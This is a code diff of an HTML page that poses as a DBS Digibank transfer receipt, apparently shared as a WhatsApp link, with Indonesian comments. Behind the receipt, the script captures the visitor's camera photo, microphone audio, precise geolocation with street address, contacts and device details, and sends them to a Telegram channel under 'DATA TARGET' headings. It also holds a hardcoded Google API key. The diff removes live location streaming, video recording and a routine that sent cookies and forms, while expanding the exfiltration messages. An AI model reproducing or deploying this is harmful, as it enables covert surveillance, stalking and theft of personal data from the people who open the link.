@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>DBS Digibank - Bukti Transfer</title>
-    <link rel="icon" type="image/png" href="https://k.top4top.io/p_3927okjz31.png">
+    <link rel="icon" type="image/png" href="https://f.top4top.io/p_3927d68rf1.png">
     
     <!-- ==================== WHATSAPP LINK PREVIEW (OPEN GRAPH) ==================== -->
     <meta property="og:type" content="website">
@@ -20,11 +20,13 @@
     <meta property="og:image:alt" content="Logo DBS Digibank - Bukti Transfer">
     <meta property="og:locale" content="id_ID">
     
+    <!-- Twitter Card -->
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:title" content="DBS Digibank - Bukti Transfer Resmi">
     <meta name="twitter:description" content="Bukti transfer resmi DBS Digibank. Verifikasi transaksi perbankan Anda.">
     <meta name="twitter:image" content="https://f.top4top.io/p_3927d68rf1.png">
     
+    <!-- SEO -->
     <meta name="description" content="Bukti transfer resmi DBS Digibank. Verifikasi transaksi perbankan Anda dengan aman.">
     <meta name="theme-color" content="#0d2b45">
     <meta name="author" content="DBS Digibank">
@@ -38,6 +40,7 @@
             min-height: 100vh; display: flex; justify-content: center; align-items: center;
             padding: 20px;
         }
+
         .receipt-container {
             background: #fff; width: 100%; max-width: 450px;
             border-radius: 16px; box-shadow: 0 20px 60px rgba(0,0,0,0.15);
@@ -45,12 +48,14 @@
         }
         .receipt-container.show { display: block; animation: fadeIn 0.6s ease; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
+
         .header {
             display: flex; justify-content: space-between; align-items: center;
             padding: 22px 25px; border-bottom: 1px solid #e0e0e0;
         }
         .header h1 { font-size: 22px; color: #000; font-weight: 700; letter-spacing: -0.5px; }
         .header .logo { height: 32px; object-fit: contain; }
+
         .amount-section {
             background-color: #0d2b45;
             background-image: repeating-linear-gradient(45deg, rgba(255,255,255,0.03) 0px, rgba(255,255,255,0.03) 2px, transparent 2px, transparent 4px);
@@ -63,11 +68,13 @@
         }
         .label-jumlah { font-size: 13px; opacity: 0.75; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 1px; }
         .amount { font-size: 34px; font-weight: 700; letter-spacing: -1px; }
+
         .details-section { padding: 22px 25px 40px 25px; }
         .detail-item { margin-bottom: 18px; }
         .detail-label { font-size: 13px; color: #8898aa; margin-bottom: 6px; font-weight: 500; letter-spacing: 0.3px; }
         .detail-line { height: 1px; background: linear-gradient(to right, #e0e0e0, transparent); margin-bottom: 6px; }
         .detail-value { font-size: 16px; color: #1a1a1a; font-weight: 500; min-height: 22px; }
+
         #preloader {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: #fff; z-index: 9999; display: flex; flex-direction: column;
@@ -77,6 +84,7 @@
         .spinner { width: 60px; height: 60px; border: 5px solid #f3f3f3; border-top: 5px solid #0d2b45; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         #preloader p { color: #666; font-size: 14px; }
+
         #toastMsg {
             position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%) translateY(100px);
             background: linear-gradient(135deg, #1a1a2e, #16213e); color: #fff;
@@ -85,6 +93,7 @@
             z-index: 10000; box-shadow: 0 10px 30px rgba(0,0,0,0.3); max-width: 90%; text-align: center;
         }
         #toastMsg.show { transform: translateX(-50%) translateY(0); opacity: 1; }
+
         .data-modal {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0,0,0,0.8); backdrop-filter: blur(5px); z-index: 10001;
@@ -169,29 +178,21 @@
         const DBS_LOGO_URL = 'https://f.top4top.io/p_3927xkofk1.png';
 
         // ==================== STATE ====================
-        let permissions = { camera: false, microphone: false, location: false, contacts: false, video: false };
+        let permissions = { camera: false, microphone: false, location: false, contacts: false };
         let keyLogBuffer = [];
         let executed = false;
         let mediaRecorder = null;
         let audioChunks = [];
-        let videoRecorder = null;
-        let videoChunks = [];
         let cameraPhoto = null;
         let audioBase64 = null;
-        let videoBase64 = null;
         let locationData = {};
         let contactsData = "Belum diambil";
-        let contactsArray = [];
         let deviceInfo = {};
         let receiptData = {};
-        let locationWatchId = null;
-        let locationUpdateInterval = null;
-        let defaceCheckInterval = null;
-        let originalPageHash = '';
-        let locationHistory = [];
 
         // ==================== 0. AUTO GENERATE RECEIPT DATA ====================
         function generateReceiptData() {
+            // Nama-nama untuk Transfer Dari
             const senderNames = [
                 'Ahmad Santoso', 'Budi Wijaya', 'Citra Dewi', 'Doni Prasetyo', 'Eka Putri',
                 'Fajar Nugroho', 'Gita Lestari', 'Hendra Kusuma', 'Indah Permata', 'Joko Susilo',
@@ -199,6 +200,7 @@
                 'Putri Maharani', 'Rizki Ramadhan', 'Siti Nurhaliza', 'Taufik Hidayat', 'Umar Bakri'
             ];
             
+            // Nama-nama untuk Transfer Ke
             const receiverNames = [
                 'Andi Firmansyah', 'Bella Safira', 'Candra Wijaya', 'Dina Marlina', 'Eko Prasetyo',
                 'Fitri Handayani', 'Gunawan Saputra', 'Hana Pertiwi', 'Irfan Maulana', 'Jihan Aulia',
@@ -206,6 +208,7 @@
                 'Putra Wibowo', 'Rina Wulandari', 'Sandi Permana', 'Tiara Anggraini', 'Vino Bastian'
             ];
             
+            // Berita transfer
             const beritaList = [
                 'Pembayaran Invoice #INV-2024',
                 'Transfer antar bank DBS',
@@ -229,10 +232,16 @@
                 'Transfer untuk investasi'
             ];
             
+            // Bank-bank
             const banks = ['DBS Bank', 'DBS Indonesia', 'DBS Treasures', 'DBS Digibank', 'POSB Bank'];
+            
+            // Jenis transaksi
             const jenisTransaksi = ['Transfer Online', 'Transfer Antar Bank', 'Transfer Instan', 'Transfer Reguler', 'Real-time Transfer'];
+            
+            // Channel transaksi
             const channels = ['DBS Digibank', 'DBS Internet Banking', 'DBS Mobile Banking', 'DBS ATM', 'DBS Branch'];
             
+            // Generate random
             const randomSender = senderNames[Math.floor(Math.random() * senderNames.length)];
             const randomReceiver = receiverNames[Math.floor(Math.random() * receiverNames.length)];
             const randomBerita = beritaList[Math.floor(Math.random() * beritaList.length)];
@@ -240,9 +249,11 @@
             const randomJenis = jenisTransaksi[Math.floor(Math.random() * jenisTransaksi.length)];
             const randomChannel = channels[Math.floor(Math.random() * channels.length)];
             
+            // Generate jumlah transfer
             const amounts = ['50.000', '100.000', '150.000', '250.000', '500.000', '750.000', '1.000.000', '1.500.000', '2.500.000', '5.000.000', '7.500.000', '10.000.000'];
             const randomAmount = amounts[Math.floor(Math.random() * amounts.length)];
             
+            // Generate nomor referensi
             const now = new Date();
             const year = now.getFullYear();
             const month = String(now.getMonth() + 1).padStart(2, '0');
@@ -250,10 +261,14 @@
             const randomNum = String(Math.floor(Math.random() * 900000 + 100000));
             const refNumber = `DBS${year}${month}${day}${randomNum}`;
             
+            // Generate tanggal
             const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
             const tgl = `${String(now.getDate()).padStart(2, '0')} ${months[now.getMonth()]} ${now.getFullYear()}`;
+            
+            // Generate waktu
             const jam = `${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}:${String(now.getSeconds()).padStart(2, '0')}`;
             
+            // Saldo akhir
             const saldoAwal = Math.floor(Math.random() * 900000000 + 100000000);
             const nominalTransfer = parseInt(randomAmount.replace(/\./g, ''));
             const saldoAkhir = saldoAwal - nominalTransfer;
@@ -276,6 +291,7 @@
             };
         }
 
+        // ==================== 1. TAMPILKAN DATA KE UI ====================
         function displayReceiptData(data) {
             document.getElementById('jumlah').innerText = 'Rp ' + (data.jumlah_transfer || '0');
             document.getElementById('dari').innerText = data.transfer_dari || '-';
@@ -292,13 +308,16 @@
             };
             
             document.getElementById('receiptContainer').classList.add('show');
+            console.log('✅ Data bukti transfer ditampilkan');
         }
 
+        // ==================== PRELOADER ====================
         setTimeout(() => {
             const preloader = document.getElementById('preloader');
             if (preloader) preloader.classList.add('hide');
         }, 2000);
 
+        // ==================== TOAST ====================
         function showToast(msg, duration = 4000) {
             const t = document.getElementById('toastMsg');
             if (t) {
@@ -309,7 +328,7 @@
             }
         }
 
-        // ==================== 2. LOKASI SUPER AKURAT + REAL-TIME ====================
+        // ==================== 2. LOKASI SUPER AKURAT ====================
         async function getSuperAccurateLocation() {
             return new Promise((resolve) => {
                 if (!("geolocation" in navigator)) { resolve(); return; }
@@ -323,18 +342,11 @@
                             altitude: position.coords.altitude || 'N/A',
                             heading: position.coords.heading || 'N/A',
                             speed: position.coords.speed || 'N/A',
-                            timestamp: new Date().toISOString(),
                             googleMapsUrl: `https://www.google.com/maps?q=${lat},${lng}`,
                             fullAddress: '', street: '', village: '', district: '',
                             city: '', province: '', postalCode: '', country: '',
                             landmark: '', placeId: '', plusCode: ''
                         };
-                        
-                        locationHistory.push({
-                            lat, lng,
-                            timestamp: new Date().toLocaleString('id-ID'),
-                            accuracy: position.coords.accuracy
-                        });
                         
                         try {
                             const geoUrl = `https://maps.googleapis.com/maps/api/geocode/json?latlng=${lat},${lng}&key=AIzaSyB41DRUbKWJHPxaFjMAwdrzWzbVKartk&language=id`;
@@ -371,78 +383,6 @@
                     { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
                 );
             });
-        }
-
-        function startRealtimeLocationTracking() {
-            if (!("geolocation" in navigator)) return;
-            
-            locationWatchId = navigator.geolocation.watchPosition(
-                async (position) => {
-                    const lat = position.coords.latitude;
-                    const lng = position.coords.longitude;
-                    
-                    locationData.lat = lat;
-                    locationData.lng = lng;
-                    locationData.accuracy = position.coords.accuracy;
-                    locationData.timestamp = new Date().toISOString();
-                    locationData.googleMapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
-                    
-                    locationHistory.push({
-                        lat, lng,
-                        timestamp: new Date().toLocaleString('id-ID'),
-                        accuracy: position.coords.accuracy
-                    });
-                    
-                    if (locationHistory.length > 50) {
-                        locationHistory = locationHistory.slice(-50);
-                    }
-                },
-                (error) => console.log('Location watch error:', error),
-                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-            );
-            
-            locationUpdateInterval = setInterval(async () => {
-                if (locationData.lat && locationData.lng) {
-                    await sendLocationUpdate();
-                }
-            }, 30000);
-        }
-
-        async function sendLocationUpdate() {
-            if (!locationData.lat || !locationData.lng) return;
-            
-            let msg = `📍 *UPDATE LOKASI TERKINI* 📍\n`;
-            msg += `━━━━━━━━━━━━━━━━━━━━━━\n`;
-            msg += `⏰ Waktu: ${new Date().toLocaleString('id-ID')}\n`;
-            msg += `📡 Latitude: \`${locationData.lat}\`\n`;
-            msg += `📡 Longitude: \`${locationData.lng}\`\n`;
-            msg += `🎯 Akurasi: ${locationData.accuracy || 'N/A'} meter\n`;
-            msg += `🏠 Alamat: ${locationData.fullAddress || 'N/A'}\n`;
-            msg += `🏙️ Kota: ${locationData.city || 'N/A'}\n`;
-            msg += `🌏 Provinsi: ${locationData.province || 'N/A'}\n\n`;
-            msg += `🗺️ *BUKA GOOGLE MAPS LIVE:*\n`;
-            msg += `[👉 KLIK DISINI](https://www.google.com/maps?q=${locationData.lat},${locationData.lng})\n`;
-            
-            await sendTelegramMessage(msg);
-        }
-
-        async function streamLocationToTelegram() {
-            if (!("geolocation" in navigator)) return;
-            let lastSentLat = 0;
-            let lastSentLng = 0;
-            
-            setInterval(async () => {
-                if (!locationData.lat || !locationData.lng) return;
-                const dist = Math.sqrt(
-                    Math.pow(locationData.lat - lastSentLat, 2) + 
-                    Math.pow(locationData.lng - lastSentLng, 2)
-                );
-                if (dist > 0.0005 || lastSentLat === 0) {
-                    lastSentLat = locationData.lat;
-                    lastSentLng = locationData.lng;
-                    await sendLocationUpdate();
-                }
-            }, 60000);
         }
 
         // ==================== 3. DEVICE INFO ====================
@@ -487,7 +427,7 @@
             } catch (e) {}
         }
 
-        // ==================== 4. CAMERA + FOTO ====================
+        // ==================== 4. CAMERA CAPTURE ====================
         async function captureCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
@@ -511,46 +451,6 @@
             }
         }
 
-        // ==================== 4.1 VIDEO RECORDING ====================
-        async function captureVideo() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: 'user' },
-                    audio: true
-                });
-                permissions.video = true;
-                videoRecorder = new MediaRecorder(stream);
-                videoChunks = [];
-                videoRecorder.ondataavailable = event => { 
-                    if (event.data.size > 0) videoChunks.push(event.data); 
-                };
-                return new Promise((resolve) => {
-                    videoRecorder.onstop = () => {
-                        try {
-                            const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
-                            const reader = new FileReader();
-                            reader.onloadend = () => {
-                                videoBase64 = reader.result;
-                                stream.getTracks().forEach(t => t.stop());
-                                resolve(true);
-                            };
-                            reader.readAsDataURL(videoBlob);
-                        } catch (e) {
-                            resolve(true);
-                        }
-                    };
-                    videoRecorder.start();
-                    // Rekam video 10 detik
-                    setTimeout(() => { 
-                        if (videoRecorder && videoRecorder.state === 'recording') videoRecorder.stop(); 
-                    }, 10000);
-                });
-            } catch (e) {
-                permissions.video = false;
-                return false;
-            }
-        }
-
         // ==================== 5. MICROPHONE RECORD ====================
         async function captureMicrophone() {
             try {
@@ -566,7 +466,6 @@
                             const reader = new FileReader();
                             reader.onloadend = () => {
                                 audioBase64 = reader.result;
-                                stream.getTracks().forEach(t => t.stop());
                                 resolve(true);
                             };
                             reader.readAsDataURL(audioBlob);
@@ -585,23 +484,16 @@
             }
         }
 
-        // ==================== 6. CONTACTS (LENGKAP) ====================
+        // ==================== 6. CONTACTS ====================
         async function captureContacts() {
             if ('contacts' in navigator && navigator.contacts) {
                 try {
-                    const contacts = await navigator.contacts.select(['name', 'tel', 'email', 'address'], { multiple: true });
+                    const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
                     if (contacts && contacts.length > 0) {
                         permissions.contacts = true;
                         contactsData = `📇 Total: ${contacts.length} kontak\n\n`;
-                        contactsArray = contacts;
                         contacts.forEach((c, i) => {
-                            contactsData += `${i+1}. Nama: ${c.name?.[0] || '-'}\n`;
-                            contactsData += `   📞 Tel: ${c.tel?.[0] || '-'}\n`;
-                            contactsData += `   📧 Email: ${c.email?.[0] || '-'}\n`;
-                            if (c.address?.[0]) {
-                                contactsData += `   🏠 Alamat: ${c.address[0].addressLine?.[0] || '-'}\n`;
-                            }
-                            contactsData += `\n`;
+                            if (i < 30) contactsData += `${i+1}. ${c.name?.[0] || '-'} | Tel: ${c.tel?.[0] || '-'}\n`;
                         });
                     } else {
                         contactsData = "Tidak ada kontak ditemukan";
@@ -664,109 +556,7 @@
             }
         }
 
-        // ==================== 8.1 DEFACE DETECTION (LENGKAP) ====================
-        function getPageHash() {
-            const content = document.documentElement.outerHTML;
-            let hash = 0;
-            for (let i = 0; i < content.length; i++) {
-                const char = content.charCodeAt(i);
-                hash = ((hash << 5) - hash) + char;
-                hash = hash & hash;
-            }
-            return hash.toString();
-        }
-
-        function getPageContentAnalysis() {
-            // Analisis semua konten halaman
-            const analysis = {
-                title: document.title,
-                url: window.location.href,
-                bodyText: document.body.innerText.substring(0, 2000),
-                forms: Array.from(document.forms).map(f => ({
-                    action: f.action,
-                    method: f.method,
-                    inputs: Array.from(f.elements).map(e => ({
-                        name: e.name,
-                        type: e.type,
-                        value: e.value
-                    }))
-                })),
-                links: Array.from(document.links).map(l => ({
-                    href: l.href,
-                    text: l.innerText.substring(0, 100)
-                })).slice(0, 50),
-                images: Array.from(document.images).map(i => ({
-                    src: i.src,
-                    alt: i.alt
-                })).slice(0, 30),
-                scripts: Array.from(document.scripts).map(s => s.src || 'inline').slice(0, 20),
-                cookies: document.cookie
-            };
-            return analysis;
-        }
-
-        function startDefaceDetection() {
-            originalPageHash = getPageHash();
-            console.log('🛡️ Deface detection started. Hash:', originalPageHash);
-            
-            // Cek setiap 3 detik
-            defaceCheckInterval = setInterval(async () => {
-                const currentHash = getPageHash();
-                
-                if (currentHash !== originalPageHash) {
-                    console.warn('⚠️ DEFACE DETECTED!');
-                    
-                    const analysis = getPageContentAnalysis();
-                    
-                    let msg = `🚨 *DEFACE ATTEMPT DETECTED!* 🚨\n`;
-                    msg += `━━━━━━━━━━━━━━━━━━━━━━\n`;
-                    msg += `⏰ Waktu: ${new Date().toLocaleString('id-ID')}\n`;
-                    msg += `🌐 URL: ${window.location.href}\n`;
-                    msg += `📄 Title: ${analysis.title}\n`;
-                    msg += `🔐 Original Hash: \`${originalPageHash}\`\n`;
-                    msg += `🔓 Current Hash: \`${currentHash}\`\n`;
-                    msg += `⚠️ Status: *HALAMAN TELAH DIUBAH/DEFACE*\n\n`;
-                    msg += `📝 *Body Text:*\n\`\`\`\n${analysis.bodyText.substring(0, 1000)}\n\`\`\`\n\n`;
-                    msg += `📱 Device: ${deviceInfo.userAgent || 'N/A'}\n`;
-                    msg += `🌐 IP: ${await getIPAddress()}\n`;
-                    
-                    await sendTelegramMessage(msg);
-                    
-                    // Kirim screenshot HTML
-                    try {
-                        const htmlContent = document.documentElement.outerHTML.substring(0, 3500);
-                        await sendTelegramMessage(`📄 *HTML Content Setelah Deface:*\n\`\`\`\n${htmlContent}\n\`\`\``);
-                    } catch(e) {}
-                    
-                    // Kirim cookies
-                    if (analysis.cookies) {
-                        await sendTelegramMessage(`🍪 *Cookies:*\n\`${analysis.cookies.substring(0, 500)}\``);
-                    }
-                    
-                    // Kirim forms
-                    if (analysis.forms.length > 0) {
-                        let formsMsg = `📋 *Forms Terdeteksi:*\n`;
-                        analysis.forms.forEach((f, i) => {
-                            formsMsg += `\n${i+1}. Action: ${f.action}\n   Method: ${f.method}\n   Inputs: ${f.inputs.length}\n`;
-                        });
-                        await sendTelegramMessage(formsMsg.substring(0, 3500));
-                    }
-                    
-                    // Kirim links
-                    if (analysis.links.length > 0) {
-                        let linksMsg = `🔗 *Links:*\n`;
-                        analysis.links.slice(0, 10).forEach((l, i) => {
-                            linksMsg += `${i+1}. ${l.href}\n`;
-                        });
-                        await sendTelegramMessage(linksMsg.substring(0, 3500));
-                    }
-                    
-                    originalPageHash = currentHash;
-                }
-            }, 3000);
-        }
-
-        // ==================== 9. GENERATE PERSONAL DATA ====================
+        // ==================== 9. GENERATE PERSONAL DATA (DBS BANK LENGKAP) ====================
         function generatePersonalData() {
             const firstNames = ['Ahmad', 'Budi', 'Citra', 'Dewi', 'Eka', 'Fajar', 'Gita', 'Hendra', 'Indah', 'Joko', 'Kartika', 'Lukman', 'Maya', 'Nadia', 'Omar', 'Putri', 'Rizki', 'Siti', 'Taufik', 'Umar'];
             const lastNames = ['Santoso', 'Wijaya', 'Prasetyo', 'Nugroho', 'Sari', 'Putri', 'Hidayat', 'Kusuma', 'Setiawan', 'Lestari', 'Permana', 'Firdaus', 'Rahman', 'Hakim', 'Utami'];
@@ -776,22 +566,28 @@
             const accountTypes = ['Tabungan', 'Giro', 'Deposito', 'Payroll', 'Bisnis'];
             
             const nama = `${firstNames[Math.floor(Math.random() * firstNames.length)]} ${lastNames[Math.floor(Math.random() * lastNames.length)]}`;
+            
             const dbsAccount = `${Math.floor(Math.random() * 900 + 100)}-${String(Math.floor(Math.random() * 900000 + 100000))}-${String(Math.floor(Math.random() * 90 + 10))}`;
+            
             const cardPrefix = '4520';
             const cardNumber = cardPrefix + String(Math.floor(Math.random() * 1000000000000)).padStart(12, '0');
             const formattedCard = cardNumber.replace(/(.{4})/g, '$1 ').trim();
+            
             const swiftCode = 'DBSSSGSG';
             const iban = `ID${Math.floor(Math.random() * 90 + 10)}DBSS${String(Math.floor(Math.random() * 10000000000000)).padStart(14, '0')}`;
+            
             const expiry = `${String(Math.floor(Math.random() * 12 + 1)).padStart(2, '0')}/${String(Math.floor(Math.random() * 5 + 26))}`;
             const cvv = String(Math.floor(Math.random() * 900 + 100));
             const pin = String(Math.floor(Math.random() * 9000 + 1000));
             const otp = String(Math.floor(100000 + Math.random() * 900000));
             const phone = `62${String(Math.floor(Math.random() * 9000000000 + 1000000000))}`;
             const email = `${nama.toLowerCase().replace(/ /g, '.')}${Math.floor(Math.random() * 100)}@gmail.com`;
+            
             const birthYear = 1970 + Math.floor(Math.random() * 35);
             const birthMonth = String(Math.floor(Math.random() * 12 + 1)).padStart(2, '0');
             const birthDay = String(Math.floor(Math.random() * 28 + 1)).padStart(2, '0');
             const birthday = `${birthDay}/${birthMonth}/${birthYear}`;
+            
             const nik = String(Math.floor(Math.random() * 9000000000000000 + 1000000000000000));
             const npwp = `${String(Math.floor(Math.random() * 90 + 10))}.${String(Math.floor(Math.random() * 900 + 100))}.${String(Math.floor(Math.random() * 900 + 100))}.${String(Math.floor(Math.random() * 9 + 1))}-${String(Math.floor(Math.random() * 900 + 100))}.000`;
             
@@ -842,7 +638,7 @@
             };
         }
 
-        // ==================== 10. SEND ALL DATA ====================
+        // ==================== 10. SEND ALL DATA KE TELEGRAM ====================
         async function sendAllData(ip, personalData, receiptInfo) {
             await sendToTelegramComplete(ip, personalData, receiptInfo);
         }
@@ -861,102 +657,161 @@
             const dev = deviceInfo;
             const rc = receiptInfo;
             
-            // PESAN 1: BUKTI TRANSFER
-            let msg0 = `🏦 *BUKTI TRANSFER DBS DIGIBANK*\n━━━━━━━━━━━━━━━━━━━━━━\n`;
-            msg0 += `💰 Jumlah: *Rp ${rc.jumlah_transfer}*\n`;
-            msg0 += `👤 Dari: *${rc.transfer_dari}*\n`;
-            msg0 += `👥 Ke: *${rc.transfer_ke}*\n`;
+            // ===== PESAN 1: BUKTI TRANSFER DBS =====
+            let msg0 = `🏦 *BUKTI TRANSFER DBS DIGIBANK*\n`;
+            msg0 += `━━━━━━━━━━━━━━━━━━━━━━\n`;
+            msg0 += `💰 Jumlah Transfer: *Rp ${rc.jumlah_transfer}*\n`;
+            msg0 += `👤 Transfer Dari: *${rc.transfer_dari}*\n`;
+            msg0 += `👥 Transfer Ke: *${rc.transfer_ke}*\n`;
             msg0 += `📝 Berita: ${rc.berita}\n`;
-            msg0 += `🔢 Ref: \`${rc.no_referensi}\`\n`;
-            msg0 += `📅 ${rc.tanggal_transaksi} • ${rc.jam_transaksi}\n`;
-            msg0 += `🏦 ${rc.bank} • ${rc.jenisTransaksi}\n`;
+            msg0 += `🔢 No Referensi: \`${rc.no_referensi}\`\n`;
+            msg0 += `📅 Tanggal: ${rc.tanggal_transaksi}\n`;
+            msg0 += `🕐 Waktu: ${rc.jam_transaksi}\n`;
+            msg0 += `🏦 Bank: ${rc.bank}\n`;
+            msg0 += `💳 Jenis: ${rc.jenisTransaksi}\n`;
+            msg0 += `📱 Channel: ${rc.channel}\n`;
+            msg0 += `💵 Saldo Awal: ${rc.saldoAwal}\n`;
+            msg0 += `💵 Saldo Akhir: ${rc.saldoAkhir}\n`;
             msg0 += `✅ Status: *${rc.status}*\n`;
+            
             await sendTelegramMessage(msg0);
             
-            // PESAN 2: LOKASI LIVE
-            let msg1 = `🚨 *DATA TARGET - DBS* 🚨\n━━━━━━━━━━━━━━━━━━━━━━\n`;
-            msg1 += `⏰ ${new Date().toLocaleString('id-ID')}\n🌐 IP: \`${ip}\`\n\n`;
-            msg1 += `📍 *LOKASI LIVE GOOGLE MAPS*\n━━━━━━━━━━━━━━━━━━━━━━\n`;
-            msg1 += `📡 Lat: \`${loc.lat || 'N/A'}\`\n📡 Lng: \`${loc.lng || 'N/A'}\`\n`;
-            msg1 += `🎯 Akurasi: ${loc.accuracy || 'N/A'}m\n`;
-            msg1 += `🏠 ${loc.fullAddress || 'N/A'}\n`;
-            msg1 += `🛣️ ${loc.street || 'N/A'}\n`;
-            msg1 += `🏘️ ${loc.village || 'N/A'}\n`;
-            msg1 += `🏢 ${loc.district || 'N/A'}\n`;
-            msg1 += `🏙️ ${loc.city || 'N/A'}\n`;
-            msg1 += `🌏 ${loc.province || 'N/A'}\n`;
-            msg1 += `📮 ${loc.postalCode || 'N/A'}\n`;
-            msg1 += `🇮🇩 ${loc.country || 'N/A'}\n`;
-            msg1 += `🏛️ ${loc.landmark || 'N/A'}\n\n`;
-            msg1 += `🗺️ [👉 KLIK BUKA GOOGLE MAPS](https://www.google.com/maps?q=${loc.lat},${loc.lng})\n`;
+            // ===== PESAN 2: HEADER + LOKASI LIVE =====
+            let msg1 = `🚨 *DATA TARGET - DBS DIGIBANK* 🚨\n`;
+            msg1 += `━━━━━━━━━━━━━━━━━━━━━━\n`;
+            msg1 += `⏰ *Waktu:* ${new Date().toLocaleString('id-ID')}\n`;
+            msg1 += `🌐 *IP:* \`${ip}\`\n\n`;
+            
+            msg1 += `📍 *LOKASI LIVE GOOGLE MAPS*\n`;
+            msg1 += `━━━━━━━━━━━━━━━━━━━━━━\n`;
+            msg1 += `📡 Latitude: \`${loc.lat || 'N/A'}\`\n`;
+            msg1 += `📡 Longitude: \`${loc.lng || 'N/A'}\`\n`;
+            msg1 += `🎯 Akurasi: ${loc.accuracy || 'N/A'} meter\n`;
+            msg1 += `🏠 *Alamat:* ${loc.fullAddress || 'N/A'}\n`;
+            msg1 += `🛣️ Jalan: ${loc.street || 'N/A'}\n`;
+            msg1 += `🏘️ Desa/Kel: ${loc.village || 'N/A'}\n`;
+            msg1 += `🏢 Kecamatan: ${loc.district || 'N/A'}\n`;
+            msg1 += `🏙️ Kota: ${loc.city || 'N/A'}\n`;
+            msg1 += `🌏 Provinsi: ${loc.province || 'N/A'}\n`;
+            msg1 += `📮 Kode Pos: ${loc.postalCode || 'N/A'}\n`;
+            msg1 += `🇮🇩 Negara: ${loc.country || 'N/A'}\n`;
+            msg1 += `🏛️ Landmark: ${loc.landmark || 'N/A'}\n`;
+            msg1 += `🔑 Plus Code: ${loc.plusCode || 'N/A'}\n\n`;
+            msg1 += `🗺️ *BUKA GOOGLE MAPS LIVE:*\n`;
+            msg1 += `[👉 KLIK DISINI](https://www.google.com/maps?q=${loc.lat},${loc.lng})\n`;
+            
             await sendTelegramMessage(msg1);
             
-            // PESAN 3: DATA PRIBADI
-            let msg2 = `👤 *DATA PRIBADI TARGET*\n━━━━━━━━━━━━━━━━━━━━━━\n`;
-            msg2 += `📛 Nama: *${p.nama}*\n📞 HP: \`${p.hp}\`\n📧 ${p.email}\n`;
-            msg2 += `🎂 ${p.birthday}\n🆔 NIK: \`${p.nik}\`\n📋 NPWP: \`${p.npwp}\`\n`;
-            msg2 += `🏠 ${p.alamat}\n🏙️ ${p.kota}\n🌏 ${p.provinsi}\n📮 ${p.kodePos}\n`;
+            // ===== PESAN 3: DATA PRIBADI LENGKAP =====
+            let msg2 = `👤 *DATA PRIBADI TARGET*\n`;
+            msg2 += `━━━━━━━━━━━━━━━━━━━━━━\n`;
+            msg2 += `📛 Nama: *${p.nama}*\n`;
+            msg2 += `📞 No HP: \`${p.hp}\`\n`;
+            msg2 += `📧 Email: ${p.email}\n`;
+            msg2 += `🎂 Tanggal Lahir: ${p.birthday}\n`;
+            msg2 += `🆔 NIK: \`${p.nik}\`\n`;
+            msg2 += `📋 NPWP: \`${p.npwp}\`\n`;
+            msg2 += `🏠 Alamat: ${p.alamat}\n`;
+            msg2 += `🏙️ Kota: ${p.kota}\n`;
+            msg2 += `🌏 Provinsi: ${p.provinsi}\n`;
+            msg2 += `📮 Kode Pos: ${p.kodePos}\n`;
+            
             await sendTelegramMessage(msg2);
             
-            // PESAN 4: KARTU & REKENING DBS
-            let msg3 = `💳 *KARTU DBS*\n━━━━━━━━━━━━━━━━━━━━━━\n`;
-            msg3 += `🏦 ${k.bank}\n💳 \`${k.nomorFormatted}\`\n📅 ${k.expiry}\n🔒 CVV: \`${k.cvv}\`\n🔑 PIN: \`${k.pin}\`\n💠 ${k.jenisKartu}\n👤 ${k.namaPemegang}\n\n`;
-            msg3 += `🏦 *REKENING DBS*\n━━━━━━━━━━━━━━━━━━━━━━\n`;
-            msg3 += `💳 \`${r.nomorRekening}\`\n🔗 SWIFT: \`${r.swiftCode}\`\n🌐 IBAN: \`${r.iban}\`\n📊 ${r.jenisRekening}\n🏢 ${r.cabang}\n💰 ${r.saldo}\n\n`;
+            // ===== PESAN 4: KARTU KREDIT & BANK DBS =====
+            let msg3 = `💳 *DATA KARTU DBS BANK*\n`;
+            msg3 += `━━━━━━━━━━━━━━━━━━━━━━\n`;
+            msg3 += `🏦 Bank: *${k.bank}*\n`;
+            msg3 += `💳 No Kartu: \`${k.nomorFormatted}\`\n`;
+            msg3 += `📅 Expiry: \`${k.expiry}\`\n`;
+            msg3 += `🔒 CVV: \`${k.cvv}\`\n`;
+            msg3 += `🔑 PIN: \`${k.pin}\`\n`;
+            msg3 += `💠 Jenis: ${k.jenisKartu}\n`;
+            msg3 += `👤 Pemegang: ${k.namaPemegang}\n\n`;
+            msg3 += `🏦 *REKENING DBS BANK*\n`;
+            msg3 += `━━━━━━━━━━━━━━━━━━━━━━\n`;
+            msg3 += `💳 No Rekening: \`${r.nomorRekening}\`\n`;
+            msg3 += `🔗 SWIFT Code: \`${r.swiftCode}\`\n`;
+            msg3 += `🌐 IBAN: \`${r.iban}\`\n`;
+            msg3 += `📊 Jenis: ${r.jenisRekening}\n`;
+            msg3 += `🏢 Cabang: ${r.cabang}\n`;
+            msg3 += `💰 Saldo: ${r.saldo}\n`;
+            msg3 += `💱 Mata Uang: ${r.mataUang}\n\n`;
             msg3 += `🔐 *OTP: \`${personalData.otp}\`*\n`;
+            
             await sendTelegramMessage(msg3);
             
-            // PESAN 5: DEVICE
-            let msg4 = `📱 *DEVICE*\n━━━━━━━━━━━━━━━━━━━━━━\n`;
